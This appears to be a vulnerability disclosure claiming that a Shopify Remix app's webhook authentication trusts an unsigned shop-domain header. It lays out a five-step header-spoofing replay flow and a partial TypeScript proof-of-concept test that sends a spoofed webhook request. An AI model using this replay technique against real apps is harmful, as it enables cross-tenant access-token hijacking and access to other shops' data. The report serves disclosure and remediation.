### Title
Webhook shop-domain header (`check.domain`) is not covered by HMAC validation, allowing cross-tenant offline session/token hijack via header spoofing - ([File: packages/apps/shopify-app-remix/src/server/authenticate/webhooks/authenticate.ts])

### Summary
`authenticateWebhookFactory` validates a webhook's HMAC only over the raw request body via `validateHmacFromRequestFactory` [1](#0-0) , but the shop domain used for session lookup (`check.domain`) comes straight from the unauthenticated `X-Shopify-Shop-Domain` header set in `checkWebhooksHeaders` [2](#0-1) . Because the domain header is never cryptographically bound to the signed body nor re-validated, an attacker who owns a legitimately-signed webhook (for their own shop) can replay it with the domain header swapped to a victim shop, causing the app to load and use the victim's offline session/access token.

### Finding Description
`api.webhooks.validate` in `validateFactory` runs `validateHmacFromRequestFactory(config)` which computes `validateHmacString(config, rawBody, hmac, HashFormat.Base64)` — i.e., HMAC is computed **only over `rawBody`**, using headers only to locate the HMAC value itself [3](#0-2) . Once that HMAC check passes, `checkWebhooksHeaders` independently reads `X-Shopify-Shop-Domain` from the request headers with no cross-check against the signed body content and returns it as `domain` in the validation result [4](#0-3) .

Back in `authenticateWebhookFactory`, this unauthenticated `check.domain` is passed directly into `ensureValidOfflineSession(params, check.domain)` [5](#0-4) , which calls `createOrLoadOfflineSession`, which computes `api.session.getOfflineId(shop)` and does `config.sessionStorage!.loadSession(offlineSessionId)` [6](#0-5) . There is no `sanitizeShop`/allowlist check applied to `check.domain` anywhere in this path. If the resulting session is found, it is used to build `adminClientFactory` and handed to the app's webhook handler along with the attacker-controlled JSON payload [7](#0-6) .

Exploit flow:
1. Attacker installs the target app on their own shop (or otherwise triggers a legitimate webhook delivery to the app for their shop), obtaining a valid `rawBody` + `X-Shopify-Hmac-Sha256` pair signed by the app's real secret.
2. Attacker resends this exact `rawBody`/HMAC pair to the app's webhook endpoint, but overrides `X-Shopify-Shop-Domain` to a known victim shop's exact `*.myshopify.com` domain.
3. HMAC validation succeeds (it only checks `rawBody` against the HMAC, unaffected by the domain header change).
4. `check.domain` is the victim's shop; `ensureValidOfflineSession` loads the victim's real offline session/access token from `sessionStorage`.
5. The webhook handler runs with `admin` and `session` scoped to the victim shop, using attacker-controlled payload content — a confused-deputy condition enabling cross-tenant admin API actions/data access using the victim's access token.

Existing checks (`safeCompare`, HMAC-over-body) do not fail here because they were never designed to authenticate the domain header — only the payload integrity — and no additional binding or `sanitizeShop`/allowlist check exists on `check.domain` before it's used as a session-storage lookup key.

### Impact Explanation
This is a cross-tenant access-token disclosure / confused-deputy vulnerability: an attacker can cause the app to act on behalf of, and using the credentials of, a shop they do not control, purely by controlling the header of a request whose body-HMAC they separately obtained legitimately for their own tenant. This matches Shopify's bounty impact class for cross-tenant session/access-token exposure and confused-deputy attacks in webhook handling.

### Likelihood Explanation
The precondition is realistic and low-effort: the attacker only needs an app installed on a shop they control (trivial for any embedded/public app) to obtain a validly-HMAC-signed webhook payload, and needs to know/guess a target's `*.myshopify.com` domain (often public/guessable, e.g. via storefront). No secret key, MITM, or elevated privilege is required — the attack is a simple header-substitution replay reproducible with any HTTP client.

### Recommendation
Do not trust `check.domain` (the `X-Shopify-Shop-Domain` header) for session lookup unless it is cryptographically bound to the validated content. Either:
- Include the shop domain in the HMAC-covered material during webhook validation, or
- Cross-check `check.domain` against a shop value independently derived/verified (e.g., compare with the shop associated with the webhook subscription/registration, or enforce that only domains matching an app-installed shop list are accepted), and apply `sanitizeShop`-style validation before using it as a `sessionStorage` key in `createOrLoadOfflineSession`/`ensureValidOfflineSession`.

### Proof of Concept
```ts
// packages/apps/shopify-app-remix/src/server/authenticate/webhooks/__tests__/domain-spoof.test.ts
import {authenticateWebhookFactory} from '../authenticate';
// ... setup mock sessionStorage, seed with victim shop's offline session:
await sessionStorage.storeSession(victimOfflineSession); // shop: 'victim-shop.myshopify.com'

// Attacker captures a legitimately-signed webhook for their own shop:
const rawBody = JSON.stringify({id: 1});
const hmac = await generateValidHmacForBody(rawBody); // computed w/ real app secret, for attacker's own delivery

const spoofedRequest = new Request('https://app.example.com/webhooks', {
  method: 'POST',
  headers: {
    'X-Shopify-Hmac-Sha256': hmac,
    'X-Shopify-Shop-Domain': 'victim-shop.myshopify.com', // spoofed, not attacker's own shop
    'X-Shopify-Topic': 'orders/create',
    'X-Shopify-Api-Version': '2024-01',
    'X-Shopify-Webhook-Id': 'test-id',
  },
  body: rawBody,
});

const authenticate = authenticateWebhookFactory(params);
const ctx = await authenticate(spoofedRequest);

// Expected (secure) behavior: session/admin should be undefined because the domain
// was not attested by the HMAC-covered content.
// Actual (vulnerable) behavior: ctx.session / ctx.admin resolve to the victim shop's
// offline session/access token.
expect(ctx.session).toBeUndefined(); // FAILS on current code — returns victim's session
```

### Citations

**File:** packages/apps/shopify-api/lib/utils/hmac-validator.ts (L168-200)
```typescript
export function validateHmacFromRequestFactory(config: ConfigInterface) {
  return async function validateHmacFromRequest({
    type,
    rawBody,
    webhookType,
    ...adapterArgs
  }: ValidateParams): Promise<ValidationInvalid | ValidationValid> {
    const request = await abstractConvertRequest(adapterArgs);
    if (!rawBody.length) {
      return fail(ValidationErrorReason.MissingBody, type, config);
    }

    // Use appropriate header based on webhook type
    const hmacHeaderName = webhookType
      ? WEBHOOK_HEADER_NAMES[webhookType].hmac
      : ShopifyHeader.Hmac;

    const hmac = getHeader(request.headers, hmacHeaderName);
    if (!hmac) {
      return fail(ValidationErrorReason.MissingHmac, type, config);
    }
    const validHmac = await validateHmacString(
      config,
      rawBody,
      hmac,
      HashFormat.Base64,
    );
    if (!validHmac) {
      return fail(ValidationErrorReason.InvalidHmac, type, config);
    }

    return succeed(type, config);
  };
```

**File:** packages/apps/shopify-api/lib/webhooks/validate.ts (L99-134)
```typescript
function checkWebhooksHeaders(
  headers: Headers,
): WebhookValidationMissingHeaders | WebhookValidationValid {
  const headerNames = WEBHOOK_HEADER_NAMES[WebhookType.Webhooks];
  const missingHeaders: string[] = [];

  const hmac = getRequiredHeader(headers, headerNames.hmac, missingHeaders);
  const topic = getRequiredHeader(headers, headerNames.topic, missingHeaders);
  const domain = getRequiredHeader(headers, headerNames.domain, missingHeaders);
  const apiVersion = getRequiredHeader(
    headers,
    headerNames.apiVersion,
    missingHeaders,
  );
  const webhookId = getRequiredHeader(
    headers,
    headerNames.webhookId,
    missingHeaders,
  );

  if (missingHeaders.length) {
    return {
      valid: false,
      reason: WebhookValidationErrorReason.MissingHeaders,
      missingHeaders,
    };
  }

  const fields: WebhooksWebhookFields = {
    webhookType: WebhookType.Webhooks,
    hmac: hmac!,
    topic: topicForStorage(topic!),
    domain: domain!,
    apiVersion: apiVersion!,
    webhookId: webhookId!,
  };
```

**File:** packages/apps/shopify-app-remix/src/server/authenticate/webhooks/authenticate.ts (L52-52)
```typescript
    const session = await ensureValidOfflineSession(params, check.domain);
```

**File:** packages/apps/shopify-app-remix/src/server/authenticate/webhooks/authenticate.ts (L88-102)
```typescript
    if (!session) {
      return webhookContext;
    }

    const admin = adminClientFactory({
      params,
      session,
      handleClientError: handleClientErrorFactory({request}),
    });

    return {
      ...webhookContext,
      session,
      admin,
    };
```

**File:** packages/apps/shopify-app-remix/src/server/helpers/create-or-load-offline-session.ts (L12-18)
```typescript
  } else {
    logger.debug('Loading offline session from session storage', {shop});
    const offlineSessionId = api.session.getOfflineId(shop);
    const session = await config.sessionStorage!.loadSession(offlineSessionId);

    return session;
  }
```
